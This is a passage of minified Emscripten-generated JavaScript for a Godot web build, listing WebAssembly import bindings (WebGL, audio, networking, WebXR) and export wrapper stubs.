scall_rmdir,__syscall_sendto:___syscall_sendto,__syscall_socket:___syscall_socket,__syscall_stat64:___syscall_stat64,__syscall_statfs64:___syscall_statfs64,__syscall_symlink:___syscall_symlink,__syscall_unlinkat:___syscall_unlinkat,_dlinit:__dlinit,_dlopen_js:__dlopen_js,_dlsym_js:__dlsym_js,_emscripten_date_now:__emscripten_date_now,_emscripten_default_pthread_stack_size:__emscripten_default_pthread_stack_size,_emscripten_get_now_is_monotonic:__emscripten_get_now_is_monotonic,_emscripten_notify_task_queue:__emscripten_notify_task_queue,_emscripten_proxied_gl_context_activated_from_main_browser_thread:__emscripten_proxied_gl_context_activated_from_main_browser_thread,_emscripten_set_offscreencanvas_size:__emscripten_set_offscreencanvas_size,_emscripten_throw_longjmp:__emscripten_throw_longjmp,_gmtime_js:__gmtime_js,_localtime_js:__localtime_js,_mmap_js:__mmap_js,_munmap_js:__munmap_js,_tzset_js:__tzset_js,abort:_abort,emscripten_cancel_main_loop:_emscripten_cancel_main_loop,emscripten_check_blocking_allowed:_emscripten_check_blocking_allowed,emscripten_console_error:_emscripten_console_error,emscripten_force_exit:_emscripten_force_exit,emscripten_get_now:_emscripten_get_now,emscripten_glActiveTexture:_emscripten_glActiveTexture,emscripten_glAttachShader:_emscripten_glAttachShader,emscripten_glBeginTransformFeedback:_emscripten_glBeginTransformFeedback,emscripten_glBindBuffer:_emscripten_glBindBuffer,emscripten_glBindBufferBase:_emscripten_glBindBufferBase,emscripten_glBindBufferRange:_emscripten_glBindBufferRange,emscripten_glBindFramebuffer:_emscripten_glBindFramebuffer,emscripten_glBindRenderbuffer:_emscripten_glBindRenderbuffer,emscripten_glBindTexture:_emscripten_glBindTexture,emscripten_glBindVertexArray:_emscripten_glBindVertexArray,emscripten_glBlendColor:_emscripten_glBlendColor,emscripten_glBlendEquation:_emscripten_glBlendEquation,emscripten_glBlendFunc:_emscripten_glBlendFunc,emscripten_glBlendFuncSeparate:_emscripten_glBlendFuncSeparate,emscripten_glBlitFramebuffer:_emscripten_glBlitFramebuffer,emscripten_glBufferData:_emscripten_glBufferData,emscripten_glBufferSubData:_emscripten_glBufferSubData,emscripten_glCheckFramebufferStatus:_emscripten_glCheckFramebufferStatus,emscripten_glClear:_emscripten_glClear,emscripten_glClearBufferfv:_emscripten_glClearBufferfv,emscripten_glClearColor:_emscripten_glClearColor,emscripten_glClearDepthf:_emscripten_glClearDepthf,emscripten_glColorMask:_emscripten_glColorMask,emscripten_glCompileShader:_emscripten_glCompileShader,emscripten_glCompressedTexImage2D:_emscripten_glCompressedTexImage2D,emscripten_glCopyBufferSubData:_emscripten_glCopyBufferSubData,emscripten_glCreateProgram:_emscripten_glCreateProgram,emscripten_glCreateShader:_emscripten_glCreateShader,emscripten_glCullFace:_emscripten_glCullFace,emscripten_glDeleteBuffers:_emscripten_glDeleteBuffers,emscripten_glDeleteFramebuffers:_emscripten_glDeleteFramebuffers,emscripten_glDeleteProgram:_emscripten_glDeleteProgram,emscripten_glDeleteQueries:_emscripten_glDeleteQueries,emscripten_glDeleteRenderbuffers:_emscripten_glDeleteRenderbuffers,emscripten_glDeleteShader:_emscripten_glDeleteShader,emscripten_glDeleteSync:_emscripten_glDeleteSync,emscripten_glDeleteTextures:_emscripten_glDeleteTextures,emscripten_glDeleteVertexArrays:_emscripten_glDeleteVertexArrays,emscripten_glDepthFunc:_emscripten_glDepthFunc,emscripten_glDepthMask:_emscripten_glDepthMask,emscripten_glDisable:_emscripten_glDisable,emscripten_glDisableVertexAttribArray:_emscripten_glDisableVertexAttribArray,emscripten_glDrawArrays:_emscripten_glDrawArrays,emscripten_glDrawArraysInstanced:_emscripten_glDrawArraysInstanced,emscripten_glDrawElements:_emscripten_glDrawElements,emscripten_glDrawElementsInstanced:_emscripten_glDrawElementsInstanced,emscripten_glEnable:_emscripten_glEnable,emscripten_glEnableVertexAttribArray:_emscripten_glEnableVertexAttribArray,emscripten_glEndTransformFeedback:_emscripten_glEndTransformFeedback,emscripten_glFenceSync:_emscripten_glFenceSync,emscripten_glFinish:_emscripten_glFinish,emscripten_glFramebufferRenderbuffer:_emscripten_glFramebufferRenderbuffer,emscripten_glFramebufferTexture2D:_emscripten_glFramebufferTexture2D,emscripten_glFramebufferTextureLayer:_emscripten_glFramebufferTextureLayer,emscripten_glFrontFace:_emscripten_glFrontFace,emscripten_glGenBuffers:_emscripten_glGenBuffers,emscripten_glGenFramebuffers:_emscripten_glGenFramebuffers,emscripten_glGenQueries:_emscripten_glGenQueries,emscripten_glGenRenderbuffers:_emscripten_glGenRenderbuffers,emscripten_glGenTextures:_emscripten_glGenTextures,emscripten_glGenVertexArrays:_emscripten_glGenVertexArrays,emscripten_glGenerateMipmap:_emscripten_glGenerateMipmap,emscripten_glGetFloatv:_emscripten_glGetFloatv,emscripten_glGetIntegerv:_emscripten_glGetIntegerv,emscripten_glGetProgramInfoLog:_emscripten_glGetProgramInfoLog,emscripten_glGetProgramiv:_emscripten_glGetProgramiv,emscripten_glGetShaderInfoLog:_emscripten_glGetShaderInfoLog,emscripten_glGetShaderiv:_emscripten_glGetShaderiv,emscripten_glGetString:_emscripten_glGetString,emscripten_glGetStringi:_emscripten_glGetStringi,emscripten_glGetSynciv:_emscripten_glGetSynciv,emscripten_glGetUniformBlockIndex:_emscripten_glGetUniformBlockIndex,emscripten_glGetUniformLocation:_emscripten_glGetUniformLocation,emscripten_glLinkProgram:_emscripten_glLinkProgram,emscripten_glPixelStorei:_emscripten_glPixelStorei,emscripten_glReadBuffer:_emscripten_glReadBuffer,emscripten_glReadPixels:_emscripten_glReadPixels,emscripten_glRenderbufferStorage:_emscripten_glRenderbufferStorage,emscripten_glScissor:_emscripten_glScissor,emscripten_glShaderSource:_emscripten_glShaderSource,emscripten_glTexImage2D:_emscripten_glTexImage2D,emscripten_glTexImage3D:_emscripten_glTexImage3D,emscripten_glTexParameterf:_emscripten_glTexParameterf,emscripten_glTexParameteri:_emscripten_glTexParameteri,emscripten_glTexStorage2D:_emscripten_glTexStorage2D,emscripten_glTexSubImage3D:_emscripten_glTexSubImage3D,emscripten_glTransformFeedbackVaryings:_emscripten_glTransformFeedbackVaryings,emscripten_glUniform1f:_emscripten_glUniform1f,emscripten_glUniform1i:_emscripten_glUniform1i,emscripten_glUniform1iv:_emscripten_glUniform1iv,emscripten_glUniform1ui:_emscripten_glUniform1ui,emscripten_glUniform1uiv:_emscripten_glUniform1uiv,emscripten_glUniform2f:_emscripten_glUniform2f,emscripten_glUniform2fv:_emscripten_glUniform2fv,emscripten_glUniform2iv:_emscripten_glUniform2iv,emscripten_glUniform3fv:_emscripten_glUniform3fv,emscripten_glUniform4f:_emscripten_glUniform4f,emscripten_glUniform4fv:_emscripten_glUniform4fv,emscripten_glUniformBlockBinding:_emscripten_glUniformBlockBinding,emscripten_glUniformMatrix4fv:_emscripten_glUniformMatrix4fv,emscripten_glUseProgram:_emscripten_glUseProgram,emscripten_glVertexAttrib4f:_emscripten_glVertexAttrib4f,emscripten_glVertexAttribDivisor:_emscripten_glVertexAttribDivisor,emscripten_glVertexAttribIPointer:_emscripten_glVertexAttribIPointer,emscripten_glVertexAttribPointer:_emscripten_glVertexAttribPointer,emscripten_glViewport:_emscripten_glViewport,emscripten_memcpy_big:_emscripten_memcpy_big,emscripten_num_logical_cores:_emscripten_num_logical_cores,emscripten_receive_on_main_thread_js:_emscripten_receive_on_main_thread_js,emscripten_resize_heap:_emscripten_resize_heap,emscripten_set_main_loop:_emscripten_set_main_loop,emscripten_supports_offscreencanvas:_emscripten_supports_offscreencanvas,emscripten_unwind_to_js_event_loop:_emscripten_unwind_to_js_event_loop,emscripten_webgl_destroy_context:_emscripten_webgl_destroy_context,emscripten_webgl_do_commit_frame:_emscripten_webgl_do_commit_frame,emscripten_webgl_do_create_context:_emscripten_webgl_do_create_context,emscripten_webgl_enable_extension:_emscripten_webgl_enable_extension,emscripten_webgl_init_context_attributes:_emscripten_webgl_init_context_attributes,emscripten_webgl_make_context_current_calling_thread:_emscripten_webgl_make_context_current_calling_thread,environ_get:_environ_get,environ_sizes_get:_environ_sizes_get,exit:_exit,fd_close:_fd_close,fd_fdstat_get:_fd_fdstat_get,fd_read:_fd_read,fd_seek:_fd_seek,fd_write:_fd_write,getTempRet0:_getTempRet0,getaddrinfo:_getaddrinfo,getnameinfo:_getnameinfo,glGetBufferSubData:_glGetBufferSubData,godot_audio_has_worklet:_godot_audio_has_worklet,godot_audio_init:_godot_audio_init,godot_audio_input_start:_godot_audio_input_start,godot_audio_input_stop:_godot_audio_input_stop,godot_audio_is_available:_godot_audio_is_available,godot_audio_resume:_godot_audio_resume,godot_audio_worklet_create:_godot_audio_worklet_create,godot_audio_worklet_start:_godot_audio_worklet_start,godot_audio_worklet_state_add:_godot_audio_worklet_state_add,godot_audio_worklet_state_get:_godot_audio_worklet_state_get,godot_audio_worklet_state_wait:_godot_audio_worklet_state_wait,godot_js_config_canvas_id_get:_godot_js_config_canvas_id_get,godot_js_config_locale_get:_godot_js_config_locale_get,godot_js_display_alert:_godot_js_display_alert,godot_js_display_canvas_focus:_godot_js_display_canvas_focus,godot_js_display_canvas_is_focused:_godot_js_display_canvas_is_focused,godot_js_display_clipboard_get:_godot_js_display_clipboard_get,godot_js_display_clipboard_set:_godot_js_display_clipboard_set,godot_js_display_cursor_is_hidden:_godot_js_display_cursor_is_hidden,godot_js_display_cursor_is_locked:_godot_js_display_cursor_is_locked,godot_js_display_cursor_lock_set:_godot_js_display_cursor_lock_set,godot_js_display_cursor_set_custom_shape:_godot_js_display_cursor_set_custom_shape,godot_js_display_cursor_set_shape:_godot_js_display_cursor_set_shape,godot_js_display_cursor_set_visible:_godot_js_display_cursor_set_visible,godot_js_display_desired_size_set:_godot_js_display_desired_size_set,godot_js_display_fullscreen_cb:_godot_js_display_fullscreen_cb,godot_js_display_fullscreen_exit:_godot_js_display_fullscreen_exit,godot_js_display_fullscreen_request:_godot_js_display_fullscreen_request,godot_js_display_has_webgl:_godot_js_display_has_webgl,godot_js_display_is_swap_ok_cancel:_godot_js_display_is_swap_ok_cancel,godot_js_display_notification_cb:_godot_js_display_notification_cb,godot_js_display_pixel_ratio_get:_godot_js_display_pixel_ratio_get,godot_js_display_screen_dpi_get:_godot_js_display_screen_dpi_get,godot_js_display_screen_size_get:_godot_js_display_screen_size_get,godot_js_display_setup_canvas:_godot_js_display_setup_canvas,godot_js_display_size_update:_godot_js_display_size_update,godot_js_display_touchscreen_is_available:_godot_js_display_touchscreen_is_available,godot_js_display_tts_available:_godot_js_display_tts_available,godot_js_display_vk_available:_godot_js_display_vk_available,godot_js_display_vk_cb:_godot_js_display_vk_cb,godot_js_display_vk_hide:_godot_js_display_vk_hide,godot_js_display_vk_show:_godot_js_display_vk_show,godot_js_display_window_blur_cb:_godot_js_display_window_blur_cb,godot_js_display_window_icon_set:_godot_js_display_window_icon_set,godot_js_display_window_size_get:_godot_js_display_window_size_get,godot_js_display_window_title_set:_godot_js_display_window_title_set,godot_js_eval:_godot_js_eval,godot_js_fetch_body_length_get:_godot_js_fetch_body_length_get,godot_js_fetch_create:_godot_js_fetch_create,godot_js_fetch_free:_godot_js_fetch_free,godot_js_fetch_http_status_get:_godot_js_fetch_http_status_get,godot_js_fetch_is_chunked:_godot_js_fetch_is_chunked,godot_js_fetch_read_chunk:_godot_js_fetch_read_chunk,godot_js_fetch_read_headers:_godot_js_fetch_read_headers,godot_js_fetch_state_get:_godot_js_fetch_state_get,godot_js_input_drop_files_cb:_godot_js_input_drop_files_cb,godot_js_input_gamepad_cb:_godot_js_input_gamepad_cb,godot_js_input_gamepad_sample:_godot_js_input_gamepad_sample,godot_js_input_gamepad_sample_count:_godot_js_input_gamepad_sample_count,godot_js_input_gamepad_sample_get:_godot_js_input_gamepad_sample_get,godot_js_input_key_cb:_godot_js_input_key_cb,godot_js_input_mouse_button_cb:_godot_js_input_mouse_button_cb,godot_js_input_mouse_move_cb:_godot_js_input_mouse_move_cb,godot_js_input_mouse_wheel_cb:_godot_js_input_mouse_wheel_cb,godot_js_input_paste_cb:_godot_js_input_paste_cb,godot_js_input_touch_cb:_godot_js_input_touch_cb,godot_js_input_vibrate_handheld:_godot_js_input_vibrate_handheld,godot_js_os_download_buffer:_godot_js_os_download_buffer,godot_js_os_execute:_godot_js_os_execute,godot_js_os_finish_async:_godot_js_os_finish_async,godot_js_os_fs_is_persistent:_godot_js_os_fs_is_persistent,godot_js_os_fs_sync:_godot_js_os_fs_sync,godot_js_os_has_feature:_godot_js_os_has_feature,godot_js_os_hw_concurrency_get:_godot_js_os_hw_concurrency_get,godot_js_os_request_quit_cb:_godot_js_os_request_quit_cb,godot_js_os_shell_open:_godot_js_os_shell_open,godot_js_pwa_cb:_godot_js_pwa_cb,godot_js_pwa_update:_godot_js_pwa_update,godot_js_rtc_datachannel_close:_godot_js_rtc_datachannel_close,godot_js_rtc_datachannel_connect:_godot_js_rtc_datachannel_connect,godot_js_rtc_datachannel_destroy:_godot_js_rtc_datachannel_destroy,godot_js_rtc_datachannel_get_buffered_amount:_godot_js_rtc_datachannel_get_buffered_amount,godot_js_rtc_datachannel_id_get:_godot_js_rtc_datachannel_id_get,godot_js_rtc_datachannel_is_negotiated:_godot_js_rtc_datachannel_is_negotiated,godot_js_rtc_datachannel_is_ordered:_godot_js_rtc_datachannel_is_ordered,godot_js_rtc_datachannel_label_get:_godot_js_rtc_datachannel_label_get,godot_js_rtc_datachannel_max_packet_lifetime_get:_godot_js_rtc_datachannel_max_packet_lifetime_get,godot_js_rtc_datachannel_max_retransmits_get:_godot_js_rtc_datachannel_max_retransmits_get,godot_js_rtc_datachannel_protocol_get:_godot_js_rtc_datachannel_protocol_get,godot_js_rtc_datachannel_ready_state_get:_godot_js_rtc_datachannel_ready_state_get,godot_js_rtc_datachannel_send:_godot_js_rtc_datachannel_send,godot_js_rtc_pc_close:_godot_js_rtc_pc_close,godot_js_rtc_pc_create:_godot_js_rtc_pc_create,godot_js_rtc_pc_datachannel_create:_godot_js_rtc_pc_datachannel_create,godot_js_rtc_pc_destroy:_godot_js_rtc_pc_destroy,godot_js_rtc_pc_ice_candidate_add:_godot_js_rtc_pc_ice_candidate_add,godot_js_rtc_pc_local_description_set:_godot_js_rtc_pc_local_description_set,godot_js_rtc_pc_offer_create:_godot_js_rtc_pc_offer_create,godot_js_rtc_pc_remote_description_set:_godot_js_rtc_pc_remote_description_set,godot_js_tts_get_voices:_godot_js_tts_get_voices,godot_js_tts_is_paused:_godot_js_tts_is_paused,godot_js_tts_is_speaking:_godot_js_tts_is_speaking,godot_js_tts_pause:_godot_js_tts_pause,godot_js_tts_resume:_godot_js_tts_resume,godot_js_tts_speak:_godot_js_tts_speak,godot_js_tts_stop:_godot_js_tts_stop,godot_js_websocket_buffered_amount:_godot_js_websocket_buffered_amount,godot_js_websocket_close:_godot_js_websocket_close,godot_js_websocket_create:_godot_js_websocket_create,godot_js_websocket_destroy:_godot_js_websocket_destroy,godot_js_websocket_send:_godot_js_websocket_send,godot_js_wrapper_create_cb:_godot_js_wrapper_create_cb,godot_js_wrapper_create_object:_godot_js_wrapper_create_object,godot_js_wrapper_interface_get:_godot_js_wrapper_interface_get,godot_js_wrapper_object_call:_godot_js_wrapper_object_call,godot_js_wrapper_object_get:_godot_js_wrapper_object_get,godot_js_wrapper_object_getvar:_godot_js_wrapper_object_getvar,godot_js_wrapper_object_set:_godot_js_wrapper_object_set,godot_js_wrapper_object_set_cb_ret:_godot_js_wrapper_object_set_cb_ret,godot_js_wrapper_object_setvar:_godot_js_wrapper_object_setvar,godot_js_wrapper_object_unref:_godot_js_wrapper_object_unref,godot_webgl2_glFramebufferTextureMultiviewOVR:_godot_webgl2_glFramebufferTextureMultiviewOVR,godot_webxr_get_bounds_geometry:_godot_webxr_get_bounds_geometry,godot_webxr_get_color_texture:_godot_webxr_get_color_texture,godot_webxr_get_depth_texture:_godot_webxr_get_depth_texture,godot_webxr_get_frame_rate:_godot_webxr_get_frame_rate,godot_webxr_get_projection_for_view:_godot_webxr_get_projection_for_view,godot_webxr_get_render_target_size:_godot_webxr_get_render_target_size,godot_webxr_get_supported_frame_rates:_godot_webxr_get_supported_frame_rates,godot_webxr_get_transform_for_view:_godot_webxr_get_transform_for_view,godot_webxr_get_velocity_texture:_godot_webxr_get_velocity_texture,godot_webxr_get_view_count:_godot_webxr_get_view_count,godot_webxr_get_visibility_state:_godot_webxr_get_visibility_state,godot_webxr_initialize:_godot_webxr_initialize,godot_webxr_is_session_supported:_godot_webxr_is_session_supported,godot_webxr_is_supported:_godot_webxr_is_supported,godot_webxr_uninitialize:_godot_webxr_uninitialize,godot_webxr_update_input_source:_godot_webxr_update_input_source,godot_webxr_update_target_frame_rate:_godot_webxr_update_target_frame_rate,invoke_ii:invoke_ii,invoke_iii:invoke_iii,invoke_iiii:invoke_iiii,invoke_iiiii:invoke_iiiii,invoke_iiiiiii:invoke_iiiiiii,invoke_vi:invoke_vi,invoke_vii:invoke_vii,invoke_viii:invoke_viii,invoke_viiii:invoke_viiii,invoke_viiiiiii:invoke_viiiiiii,memory:wasmMemory||Module.wasmMemory,setTempRet0:_setTempRet0,strftime:_strftime,strftime_l:_strftime_l},asm=createWasm(),___wasm_call_ctors=Module.___wasm_call_ctors=createExportWrapper("__wasm_call_ctors"),_emscripten_webgl_make_context_current=Module._emscripten_webgl_make_context_current=createExportWrapper("emscripten_webgl_make_context_current"),_emscripten_webgl_commit_frame=Module._emscripten_webgl_commit_frame=createExportWrapper("emscripten_webgl_commit_frame"),_free=Module._free=createExportWrapper("free"),__Z14godot_web_mainiPPc=Module.__Z14godot_web_mainiPPc=createExportWrapper("_Z14godot_web_mainiPPc"),_main=Module._main=createExportWrapper("__main_argc_argv"),_malloc=Module._malloc=createExportWrapper("malloc"),_htonl=Module._htonl=createExportWrapper("htonl"),_htons=Module._htons=createExportWrapper("htons"),_ntohs=Module._ntohs=createExportWrapper("ntohs"),___errno_location=Module.___errno_location=createExportWrapper("__errno_location"),_fflush=Module._fflush=createExportWrapper("fflush"),__emwebxr_on_input_event=Module.__emwebxr_on_input_event=createExportWrapper("_emwebxr_on_input_event"),__emwebxr_on_simple_event=Module.__emwebxr_on_simple_event=createExportWrapper("_emwebxr_on_simple_event"),__emscripten_tls_init=Module.__emscripten_tls_init=createExportWrapper("_emscripten_tls_init"),_pthread_self=Module._pthread_self=createExportWrapper("pthread_self"),_emscripten_builtin_memalign=Module._emscripten_builtin_memalign=createExportWrapper("emscripten_builtin_memalign"),_emscripten_webgl_get_current_context=Module._emscripten_webgl_get_current_context=createExportWrapper("emscripten_webgl_get_current_context"),_emscripten_dispatch_to_thread_=Module._emscripten_dispatch_to_thread_=createExportWrapper("emscripten_dispatch_to_thread_"),___funcs_on_exit=Module.___funcs_on_exit=createExportWrapper("__funcs_on_exit"),___dl_seterr=Module.___dl_seterr=createExportWrapper("__dl_seterr"),__emscripten_thread_init=Module.__emscripten_thread_init=createExportWrapper("_emscripten_thread_init"),__emscripten_thread_crashed=Module.__emscripten_thread_crashed=createExportWrapper("_emscripten_thread_crashed"),_emscripten_main_thread_process_queued_calls=Module._emscripten_main_thread_process_queued_calls=createExportWrapper("emscripten_main_thread_process_queued_calls"),_raise=Module._raise=createExportWrapper("raise"),_emscripten_main_browser_thread_id=Module._emscripten_main_browser_thread_id=createExportWrapper("emscripten_main_browser_thread_id"),_emscripten_run_in_main_runtime_thread_js=Module._emscripten_run_in_main_runtime_thread_js=createExportWrapper("emscripten_run_in_main_runtime_thread_js"),_emscripten_stack_get_base=Module._emscripten_stack_get_base=function(){return(_emscripten_stack_get_base=Module._emscripten_stack_get_base=Module.asm.emscripten_stack_get_base).apply(null,arguments)},_emscripten_stack_get_end=Module._emscripten_stack_get_end=function(){return(_emscripten_stack_get_end=Module._emscripten_stack_get_end=Module.asm.emscripten_stack_get_end).apply(null,arguments)},__emscripten_proxy_execute_task_queue=Module.__emscripten_proxy_execute_task_queue=createExportWrapper("_emscripten_proxy_execute_task_queue"),__emscripten_thread_free_data=Module.__emscripten_thread_free_data=createExportWrapper("_emscripten_thread_free_data"),__emscripten_thread_exit=Module.__emscripten_thread_exit=createExportWrapper("_emscripten_thread_exit"),_setThrew=Module._setThrew=createExportWrapper("setThrew"),_saveSetjmp=Module._saveSetjmp=createExportWrapper("saveSetjmp"),_emscripten_stack_init=Module._emscripten_stack_init=function(){return(_emscripten_stack_init=Module._emscripten_stack_init=Module.asm.emscripten_stack_init).apply(null,arguments)},_emscripten_stack_set_limits=Module._emscripten_stack_set_limits=function(){return(_emscripten_stack_set_limits=Module._emscripten_stack_set_limits=Module.asm.emscripten_stack_set_limits).apply(null,arguments)},_emscripten_stack_get_free=Module._emscripten_stack_get_free=function(){return(_emscripten_stack_get_free=Module._emscripten_stack_get_free=Module.asm.emscripten_stack_get_free).apply(null,arguments)},stackSave=Module.stackSave=createExportWrapper("stackSave"),stackRestore=Module.stackRestore=createExportWrapper("stackRestore"),stackAlloc=Module.stackAlloc=createExportWrapper("stackAlloc"),dynCall_vjiii=Module.dynCall_vjiii=createExportWrapper("dynCall_vjiii"),dynCall_vij=Module.dynCall_vij=createExportWrapper("dynCall_vij"),dynCall_ji=Module.dynCall_ji=createExportWrapper("dynCall_ji"),dynCall_viiij=Module.dynCall_viiij=createExportWrapper("dynCall_viiij"),dynCall_jii=Module.dynCall_jii=createExportWrapper("dynCall_jii"),dynCall_viij=Module.dynCall_viij=createExportWrapper("dynCall_viij"),dynCall_jiji=Module.dynCall_jiji=createExportWrapper("dynCall_jiji"),dynCall_viiiiifiijii=Module.dynCall_viiiiifiijii=createExportWrapper("dynCall_viiiiifiijii"),dynCall_viiiiifiiijjii=Module.dynCall_viiiiifiiijjii=createExportWrapper("dynCall_viiiiifiiijjii"),dynCall_viiiiifiiijii=Module.dynCall_viiiiifiiijii=createExportWrapper("dynCall_viiiiifiiijii"),dynCall_viiiiifiiiijjii=Module.dynCall_viiiiifiiiijjii=createExportWrapper("dynCall_viiiiifiiiijjii"),dynCall_jiifff=Module.dynCall_jiifff=createExportWrapper("dynCall_jiifff"),dynCall_vijf=Module.dynCall_vijf=createExportWrapper("dynCall_vijf"),dynCall_iij=Module.dynCall_iij=createExportWrapper("dynCall_iij"),dynCall_vijiii=Module.dynCall_vijiii=createExportWrapper("dynCall_vijiii"),dynCall_vijiiii=Module.dynCall_vijiiii=createExportWrapper("dynCall_vijiiii"),dynCall_vijii=Module.dynCall_vijii=createExportWrapper("dynCall_vijii"),dynCall_viiiiij=Module.dynCall_viiiiij=createExportWrapper("dynCall_viiiiij"),dynCall_viiiiiji=Module.dynCall_viiiiiji=createExportWrapper("dynCall_viiiiiji"),dynCall_viiijii=Module.dynCall_viiijii=createExportWrapper("dynCall_viiijii"),dynCall_vijiiiiiidddd=Module.dynCall_vijiiiiiidddd=createExportWrapper("dynCall_vijiiiiiidddd"),dynCall_jij=Module.dynCall_jij=createExportWrapper("dynCall_jij"),dynCall_jiiii=Module.dynCall_jiiii=createExportWrapper("dynCall_jiiii"),dynCall_jiij=Module.dynCall_jiij=createExportWrapper("dynCall_jiij"),dynCall_jiijiiii=Module.dynCall_jiijiiii=createExportWrapper("dynCall_jiijiiii"),dynCall_jiii=Module.dynCall_jiii=createExportWrapper("dynCall_jiii"),dynCall_jiiji=Module.dynCall_jiiji=createExportWrapper("dynCall_jiiji"),dynCall_jiiiji=Module.dynCall_jiiiji=createExportWrapper("dynCall_jiiiji"),dynCall_jiijii=Module.dynCall_jiijii=createExportWrapper("dynCall_jiijii"),dynCall_iijiiij=Module.dynCall_iijiiij=createExportWrapper("dynCall_iijiiij"),dynCall_jijjjiiiiijii=Module.dynCall_jijjjiiiiijii=createExportWrapper("dynCall_jijjjiiiiijii"),dynCall_jijiiiiifiii=Module.dynCall_jijiiiiifiii=createExportWrapper("dynCall_jijiiiiifiii"),dynCall_viijiiiiiifiii=Module.dynCall_viijiiiiiifiii=createExportWrapper("dynCall_viijiiiiiifiii"),dynCall_jiiiiiii=Module.dynCall_jiiiiiii=createExportWrapper("dynCall_jiiiiiii"),dynCall_viji=Module.dynCall_viji=createExportWrapper("dynCall_viji"),dynCall_viiji=Module.dynCall_viiji=createExportWrapper("dynCall_viiji"),dynCall_viiiij=Module.dynCall_viiiij=createExportWrapper("dynCall_viiiij"),dynCall_vijj=Module.dynCall_vijj=createExportWrapper("dynCall_vijj"),dynCall_vijji=Module.dynCall_vijji=createExportWrapper("dynCall_vijji"),dynCall_vijjii=Module.dynCall_vijjii=createExportWrapper("dynCall_vijjii"),dynCall_fij=Module.dynCall_fij=createExportWrapper("dynCall_fij"),dynCall_vijiffifff=Module.dynCall_vijiffifff=createExportWrapper("dynCall_vijiffifff"),dynCall_vijff=Module.dynCall_vijff=createExportWrapper("dynCall_vijff"),dynCall_vijiffff=Module.dynCall_vijiffff=createExportWrapper("dynCall_vijiffff"),dynCall_vijjf=Module.dynCall_vijjf=createExportWrapper("dynCall_vijjf"),dynCall_vijij=Module.dynCall_vijij=createExportWrapper("dynCall_vijij"),dynCall_vijif=Module.dynCall_vijif=createExportWrapper("dynCall_vijif"),dynCall_vijiiifi=Module.dynCall_vijiiifi=createExportWrapper("dynCall_vijiiifi"),dynCall_vijiifi=Module.dynCall_vijiifi=createExportWrapper("dynCall_vijiifi"),dynCall_vijiif=Module.dynCall_vijiif=createExportWrapper("dynCall_vijiif"),dynCall_vijifi=Module.dynCall_vijifi=createExportWrapper("dynCall_vijifi"),dynCall_vijijiii=Module.dynCall_vijijiii=createExportWrapper("dynCall_vijijiii"),dynCall_vijijiiii=Module.dynCall_vijijiiii=createExportWrapper("dynCall_vijijiiii"),dynCall_vijijiiiff=Module.dynCall_vijijiiiff=createExportWrapper("dynCall_vijijiiiff"),dynCall_vijijii=Module.dynCall_vijijii=createExportWrapper("dynCall_vijijii"),dynCall_vijiijiiiiii=Module.dynCall_vijiijiiiiii=createExportWrapper("dynCall_vijiijiiiiii"),dynCall_vijiiij=Module.dynCall_vijiiij=createExportWrapper("dynCall_vijiiij"),dynCall_vijiiiiiiji=Module.dynCall_vijiiiiiiji=createExportWrapper("dynCall_vijiiiiiiji"),dynCall_vijjj=Module.dynCall_vijjj=createExportWrapper("dynCall_vijjj"),dynCall_vijdddd=Module.dynCall_vijdddd=createExportWrapper("dynCall_vijdddd"),dynCall_vijififi=Module.dynCall_vijififi=createExportWrapper("dynCall_vijififi"),dynCall_iiiij=Module.dynCall_iiiij=createExportWrapper("dynCall_iiiij"),dynCall_iijji=Module.dynCall_iijji=createExportWrapper("dynCall_iijji"),dynCall_viijj=Module.dynCall_viijj=createExportWrapper("dynCall_viijj"),dynCall_jiiiiii=Module.dynCall_jiiiiii=createExportWrapper("dynCall_jiiiiii"),dynCall_viiiiji=Module.dynCall_viiiiji=createExportWrapper("dynCall_viiiiji"),dynCall_dij=Module.dynCall_dij=createExportWrapper("dynCall_dij"),dynCall_vijd=Module.dynCall_vijd=createExportWrapper("dynCall_vijd"),dynCall_iiij=Module.dynCall_iiij=createExportWrapper("dynCall_iiij"),dynCall_jiiiii=Module.dynCall_jiiiii=createExportWrapper("dynCall_jiiiii"),dynCall_ij=Module.dynCall_ij=createExportWrapper("dynCall_ij"),dynCall_viijiiii=Module.dynCall_viijiiii=createExportWrapper("dynCall_viijiiii"),dynCall_viijiii=Module.dynCall_viijiii=createExportWrapper("dynCall_viijiii"),dynCall_iiji=Module.dynCall_iiji=createExportWrapper("dynCall_iiji"),dynCall_iiiijf=Module.dynCall_iiiijf=createExportWrapper("dynCall_iiiijf"),dynCall_vijiiiii=Module.dynCall_vijiiiii=createExportWrapper("dynCall_vijiiiii"),dynCall_vijjjii=Module.dynCall_vijjjii=createExportWrapper("dynCall_vijjjii"),dynCall_viijd=Module.dynCall_viijd=createExportWrapper("dynCall_viijd"),dynCall_diij=Module.dynCall_diij=createExportWrapper("dynCall_diij"),dynCall_viiiji=Module.dynCall_viiiji=createExportWrapper("dynCall_viiiji"),dynCall_viiijj=Module.dynCall_viiijj=createExportWrapper("dynCall_viiijj"),dynCall_viijji=Module.dynCall_viijji=createExportWrapper("dynCall_viijji"),dynCall_jiiij=Module.dynCall_jiiij=createExportWrapper("dynCall_jiiij"),dynCall_viijii=Module.dynCall_viijii=createExportWrapper("dynCall_viijii"),dynCall_jiijjj=Module.dynCall_jiijjj=createExportWrapper("dynCall_jiijjj"),dynCall_jiijj=Module.dynCall_jiijj=createExportWrapper("dynCall_jiijj"),dynCall_viiijiji=Module.dynCall_viiijiji=createExportWrapper("dynCall_viiijiji"),dynCall_viiijjiji=Module.dynCall_viiijjiji=createExportWrapper("dynCall_viiijjiji"),dynCall_viijiji=Module.dynCall_viijiji=createExportWrapper("dynCall_viijiji"),dynCall_iiiiijiii=Module.dynCall_iiiiijiii=createExportWrapper("dynCall_iiiiijiii"),dynCall_iiiiiijd=Module.dynCall_iiiiiijd=createExportWrapper("dynCall_iiiiiijd"),dynCall_diidj=Module.dynCall_diidj=createExportWrapper("dynCall_diidj"),dynCall_viiiijij=Module.dynCall_viiiijij=createExportWrapper("dynCall_viiiijij"),dynCall_viiidjj=Module.dynCall_viiidjj=createExportWrapper("dynCall_viiidjj"),dynCall_viidj=Module.dynCall_viidj=createExportWrapper("dynCall_viidj"),dynCall_iiijj=Module.dynCall_iiijj=createExportWrapper("dynCall_iiijj"),dynCall_jiid=Module.dynCall_jiid=createExportWrapper("dynCall_jiid"),dynCall_viiiiddji=Module.dynCall_viiiiddji=createExportWrapper("dynCall_viiiiddji"),dynCall_vijiiiiiiiii=Module.dynCall_vijiiiiiiiii=createExportWrapper("dynCall_vijiiiiiiiii"),dynCall_vijiiiffi=Module.dynCall_